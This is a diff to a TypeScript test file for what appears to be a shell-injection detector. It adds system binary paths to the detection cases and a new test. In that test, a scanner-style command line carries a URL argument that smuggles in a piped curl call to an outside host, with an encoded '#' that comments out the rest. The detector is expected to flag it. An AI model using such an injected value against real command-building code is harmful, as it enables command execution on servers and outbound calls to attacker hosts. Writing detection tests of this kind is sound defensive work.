@@ -21,6 +21,9 @@ t.test("it detects shell syntax", async (t) => {
   containsSyntax("/sbin/sleep", true);
   containsSyntax("/usr/bin/kill", true);
   containsSyntax("/usr/bin/killall", true);
+  containsSyntax("/usr/bin/env", true);
+  containsSyntax("/bin/ps", true);
+  containsSyntax("/usr/bin/W", true);
 });
 
 function containsSyntax(str: string, expected: boolean) {
@@ -60,5 +63,15 @@ t.test("it treats colon as a command", async () => {
   t.same(
     containsShellSyntax("https://www.google.com", "https://www.google.com"),
     false
+  );
+});
+
+t.test("it flags input as shell injection", async () => {
+  t.same(
+    containsShellSyntax(
+      "command -disable-update-check -target https://examplx.com|curl+https://cde-123.abc.domain.com+%23 -json-export /tmp/5891/8526757.json -tags microsoft,windows,exchange,iis,gitlab,oracle,cisco,joomla -stats -stats-interval 3 -retries 3 -no-stdin",
+      "https://examplx.com|curl+https://cde-123.abc.domain.com+%23"
+    ),
+    true
   );
 });
